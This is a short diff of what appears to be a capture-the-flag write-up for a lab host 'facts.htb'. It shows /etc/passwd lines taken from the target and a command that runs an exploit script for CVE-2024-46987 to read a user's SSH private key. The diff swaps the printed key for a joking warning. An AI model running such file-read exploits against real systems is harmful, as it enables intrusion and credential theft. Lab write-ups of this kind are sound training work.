@@ -150,12 +150,7 @@ trivia❌1000:1000:facts.htb:/home/trivia:/bin/bash
 william❌1001:1001::/home/william:/bin/bash
 CVE-2024-46987 %  python CVE-2024-46987.py -u http://facts.htb/ -l A -p B /home/trivia/.ssh/id_ed25519                   16:00:12
 -----BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDwzk+Vns
-5HzzMcNmI6bLPrAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIMVANpOcT3r5PLXh
-3dH7cuPHP8/JYt9Y5l+6Y4fzvKI8AAAAoPeNWi1/04C88aJt5heaIxgcMMV2BBmidxX1wY
-x+0iigwXLJSoXAR4/RNVzYfnDCmNxO8QwiURVvXPbJimAodhXpH8kqxHsgZeZ/pBrAHTn6
-Tv1Wndrabd0S/9m/XRPoXmbQbIiRP0yDPPe+1EMYn2Xy7WjWA8KcpUVZ8jz1BZHTmgXFaP
-Atzk9e3kDi6eUedyrEurIN0TUAOd/Bg1qFZHQ=
+[DONT UPLOAD SSH KEYS TO GITHUB PAGES IF U DONT WANT A HEART ATTACK]
 -----END OPENSSH PRIVATE KEY-----
 ```
 
